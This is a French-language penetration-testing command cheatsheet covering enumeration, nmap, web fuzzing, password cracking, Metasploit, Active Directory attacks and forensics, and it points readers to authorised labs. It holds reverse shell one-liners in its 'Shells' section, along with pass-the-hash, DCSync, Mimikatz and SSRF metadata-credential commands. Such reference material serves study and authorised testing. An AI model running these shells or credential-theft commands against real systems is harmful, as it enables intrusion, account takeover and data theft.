# Cheatsheet des commandes

> L'aide-mémoire à garder ouvert. **Rappel légal :** cibles autorisées uniquement (labs,
> plateformes, mandat écrit). Voir l'[avertissement du README](../README.md).

---

## Linux — système

```bash
# Navigation / fichiers
pwd ; ls -lah ; cd - ; tree -L 2
find / -name "*.conf" 2>/dev/null
find / -perm -4000 -type f 2>/dev/null      # binaires SUID (privesc)
find / -writable -type d 2>/dev/null         # dossiers inscriptibles
locate <fichier> ; which <bin> ; file <bin>

# Texte
grep -rin "motif" /chemin ; grep -oE 'regex' fichier
awk -F: '{print $1,$3}' /etc/passwd
sed 's/a/b/g' fichier ; cut -d: -f1 fichier
sort | uniq -c | sort -rn                     # analyse de fréquence

# Processus / système
ps aux ; ps -ef --forest ; top ; htop
kill -9 <pid> ; lsof -i ; lsof -p <pid>
ss -tulpn ; ss -tan state established
df -h ; du -sh * ; free -h ; uname -a ; id ; whoami

# Permissions
chmod 640 f ; chown u:g f ; getfacl f ; setfacl -m u:bob:rw f
lsattr f ; chattr +i f                        # +i = immuable

# Services / planification
systemctl status|start|stop|enable <svc>
journalctl -u <svc> -f ; journalctl --since "1 hour ago"
crontab -l ; cat /etc/crontab ; systemctl list-timers

# Logs utiles
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
grep "Accepted" /var/log/auth.log ; last ; lastb
```

## Linux — privesc (énumération)

```bash
sudo -l                                        # sudo autorisé sans mot de passe ?
getcap -r / 2>/dev/null                        # capabilities
uname -r                                        # noyau → CVE (DirtyPipe, PwnKit…)
cat /etc/crontab ; ls -la /etc/cron.*
find / -perm -4000 -type f 2>/dev/null
# Outils : ./linpeas.sh | ./lse.sh -l1 | pspy64
# Référence de détournement : GTFOBins (gtfobins.github.io)
```

---

## Réseau

```bash
# Config / diagnostic
ip a ; ip r ; ip neigh ; ip route get 8.8.8.8
ping -c4 h ; traceroute h ; mtr h
dig d.fr A +short ; dig d.fr MX ; dig +trace d.fr ; dig -x 8.8.8.8
curl -I https://h ; curl -v https://h ; wget -r URL
nc -lvnp 4444 ; nc h 4444 ; nc -zv h 1-1000

# Capture
tcpdump -i eth0 -w cap.pcap 'tcp port 80'
tcpdump -i eth0 -A 'host 1.2.3.4 and port 443'
# Wireshark (filtres d'affichage) :
#   http | dns | tcp.port==443 | ip.addr==1.2.3.4
#   tcp.flags.syn==1 && tcp.flags.ack==0
```

---

## Nmap

```bash
nmap -sn 192.168.1.0/24                        # découverte d'hôtes
nmap -sS -p- --min-rate 5000 -T4 <ip>          # SYN, tous les ports
nmap -sV -sC -O <ip>                           # versions + scripts + OS
nmap -sU --top-ports 20 <ip>                   # UDP
nmap --script=vuln <ip>                        # scripts de vulnérabilités
nmap --script=smb-enum-shares -p445 <ip>
nmap -sV -oA scan <ip>                         # sortie (normal/grep/xml)
```

## Énumération de services

```bash
# SMB (445)
enum4linux-ng -A <ip> ; smbclient -L //<ip> -N
crackmapexec smb <ip>/24                         # (ou netexec)
netexec smb <ip> -u user -p pass --shares --users
# HTTP
whatweb URL ; nikto -h URL
ffuf -u URL/FUZZ -w wordlist.txt ; gobuster dir -u URL -w wl.txt
nuclei -u URL
# SNMP (161) / DNS (53) / SMTP (25)
snmpwalk -v2c -c public <ip>
dig axfr @<ip> domaine.fr                        # transfert de zone
smtp-user-enum -M VRFY -U users.txt -t <ip>
```

---

## Web

```bash
# Découverte
curl -s URL/robots.txt ; curl -sI URL
subfinder -d cible.fr | httpx -sc -title
curl -s "https://crt.sh/?q=%25.cible.fr&output=json" | jq -r '.[].name_value' | sort -u

# SQLi (après compréhension manuelle)
sqlmap -u "URL?id=1" --batch --dbs
sqlmap -u "URL?id=1" -D base -T users --dump

# Fuzzing paramètres / vhosts
ffuf -u URL -H "Host: FUZZ.cible.fr" -w vhosts.txt
```

Payloads : **PayloadsAllTheThings** · Reverse shells : **revshells.com** · Décodage : **CyberChef**

---

## Cassage de mots de passe

```bash
# hashcat (modes fréquents)
hashcat -m 0     h.txt rockyou.txt              # MD5
hashcat -m 100   h.txt rockyou.txt              # SHA-1
hashcat -m 1000  h.txt rockyou.txt              # NTLM
hashcat -m 1800  h.txt rockyou.txt              # sha512crypt ($6$)
hashcat -m 5600  h.txt rockyou.txt              # NetNTLMv2 (Responder)
hashcat -m 13100 h.txt rockyou.txt              # Kerberoast (TGS)
hashcat -m 18200 h.txt rockyou.txt              # AS-REP
hashcat -m 16500 h.txt rockyou.txt              # JWT (HMAC)
hashcat -m 22000 h.txt rockyou.txt              # WPA/WPA2
# john
john --format=nt h.txt --wordlist=rockyou.txt ; john --show h.txt
# En ligne (spraying > brute force)
hydra -L users.txt -p 'Ete2024!' ssh://<ip>
crackmapexec smb <ip>/24 -u users.txt -p mdp.txt
```

---

## Shells

```bash
# Reverse shell (cible → attaquant)
nc -lvnp 4444                                    # écouter côté attaquant
bash -i >& /dev/tcp/IP/4444 0>&1                 # côté cible
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
# Stabiliser
python3 -c 'import pty;pty.spawn("/bin/bash")'   # puis Ctrl-Z
stty raw -echo; fg                               # puis: export TERM=xterm
```

---

## Metasploit

```
msfconsole
search type:exploit <produit>
use <chemin/exploit>
show options ; set RHOSTS <ip> ; set LHOST <votre_ip> ; set PAYLOAD <payload>
exploit
# Meterpreter : sysinfo ; getuid ; hashdump ; shell ; migrate <pid> ; portfwd
searchsploit <produit version> ; searchsploit -m <id>
```

---

## Active Directory (offensif — lab/mandat)

```bash
# Énumération
netexec smb <ip>/24 -u u -p p --users --groups
bloodhound-python -u u -p p -d dom.local -ns <dc> -c All
GetUserSPNs.py dom/u:p -dc-ip <dc> -request       # Kerberoasting
GetNPUsers.py dom/ -usersfile users.txt -dc-ip <dc> # AS-REP roasting
# Vol / réutilisation
secretsdump.py dom/u@<dc> -just-dc                  # DCSync (dump domaine)
netexec smb <ip>/24 -u Administrator -H <hash>      # Pass-the-Hash
evil-winrm -i <ip> -u Administrator -H <hash>
psexec.py -hashes :<hash> Administrator@<ip>
wmiexec.py dom/u@<ip> -hashes :<hash>
# Capture LAN
responder -I eth0
ntlmrelayx.py -tf targets.txt -smb2support
# ADCS
certipy find -u u@dom -p p -dc-ip <dc> -vulnerable
```

PowerShell (PowerView) : `Get-DomainUser -SPN` · `Get-DomainUser -PreauthNotRequired` ·
`Find-InterestingDomainAcl` · Mimikatz : `sekurlsa::logonpasswords` · `lsadump::dcsync /user:krbtgt`

---

## Windows (natif / défense)

```powershell
whoami /all ; whoami /priv                        # privilèges du jeton
net user /domain ; net group "Domain Admins" /domain
Get-ADUser -Filter * ; Get-ADGroupMember "Domain Admins"
klist                                              # tickets Kerberos
Get-WinEvent -LogName Security -MaxEvents 100 | ? Id -eq 4625
Test-NetConnection <ip> -Port 445
# Services vulnérables (chemins non quotés)
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
```

**Event ID clés :** 4624/4625 (logon), 4672 (privilèges), 4688 (process), 4720 (création compte),
4728/4732 (ajout groupe), 4768/4769 (Kerberos), 4662 (DCSync), 7045 (service), 1102 (log effacé).

---

## Forensics

```bash
# Mémoire (Volatility 3)
vol -f mem.raw windows.pslist | windows.pstree | windows.psscan
vol -f mem.raw windows.netscan | windows.malfind | windows.cmdline
# Disque
dd if=/dev/sdb of=img.dd bs=4M status=progress ; sha256sum img.dd
# Timeline (Plaso)
log2timeline.py tl.plaso img.dd ; psort.py -o l2tcsv -w tl.csv tl.plaso
# Réseau
tshark -r cap.pcap -Y http.request ; zeek -r cap.pcap
```

Outils : Autopsy/TSK · Eric Zimmerman (MFTECmd, PECmd, EvtxECmd) · KAPE · YARA · CyberChef

---

## Cloud / conteneurs

```bash
# Audit posture
prowler aws ; scout suite aws ; kube-bench ; kube-hunter
# Conteneurs
trivy image <image> ; grype <image> ; dockle <image>
# IaC / secrets / SBOM
checkov -d . ; tfsec . ; gitleaks detect --source . ; syft <image> -o spdx-json
# AWS métadonnées (via SSRF en lab) — IMDSv2 requiert un token
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## Pivoting / tunneling

```bash
ssh -L 8080:interne:80 user@pivot                 # local forward
ssh -D 1080 user@pivot                            # proxy SOCKS (→ proxychains)
# Outils dédiés : chisel, ligolo-ng, sshuttle
proxychains nmap -sT <interne>
```

---

## Encodage / décodage rapide

```bash
echo -n "x" | base64 ; echo -n "eA==" | base64 -d
echo -n "x" | xxd ; echo -n "x" | sha256sum
python3 -c 'import urllib.parse as u;print(u.quote("a b/c"))'   # URL encode
```

---

## Git & secrets

```bash
git log --oneline --graph --all ; git blame f ; git diff HEAD~3
git log -p | grep -i "password\|api_key\|secret"
gitleaks detect --source .
# .gitignore minimal : .env  *.pem  *.key  config.local.*
```

---

**← [Sommaire](../README.md)** · [Glossaire](glossaire.md) · [Ressources](ressources.md)
